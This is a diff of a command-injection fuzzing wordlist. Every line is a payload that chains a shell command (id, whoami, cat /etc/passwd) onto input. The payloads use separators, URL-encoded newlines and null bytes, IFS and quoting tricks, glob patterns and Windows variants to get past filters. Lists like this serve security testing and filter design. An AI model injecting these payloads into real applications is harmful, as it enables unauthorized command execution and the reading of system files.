@@ -1,36 +1,46 @@
-;id
-;id;
-|id
-||id
-`id`
 $(id)
 $((id))
-&id
-&&id
-;ls
-;cat /etc/passwd
-;whoami
-|whoami
-`whoami`
+$IFS$9id
+$(IFS)id
+${IFS}id
 $(whoami)
-;id%00
-;id%0a
-;id%0d%0a
+%09id
 %0a id
 %0d id
+%26 id
 %3b id
 %7c id
-%26 id
-id%0a
-id%0d
-id%00
-\nid
-\rid
+;cat /etc/passwd
+{cat,/etc/passwd}
+c"a"t /etc/passwd
+c'a't /etc/passwd
+c\at /etc/passwd
+cmd /c whoami
+&&id
+&id
+;id
+;id;
+`id`
+{id}
+||id
+|id
+id
+id&
+id&&
 id;
 id|
-id&
-cmd /c whoami
+id||
+;id%00
+id%00
+;id%0a
+id%0a
+id%0d
+;id%0d%0a
+;ls
+\nid
 powershell whoami
-{id}
-$(IFS)id
-$IFS$9id
+\rid
+/???/??ss??
+;whoami
+`whoami`
+|whoami
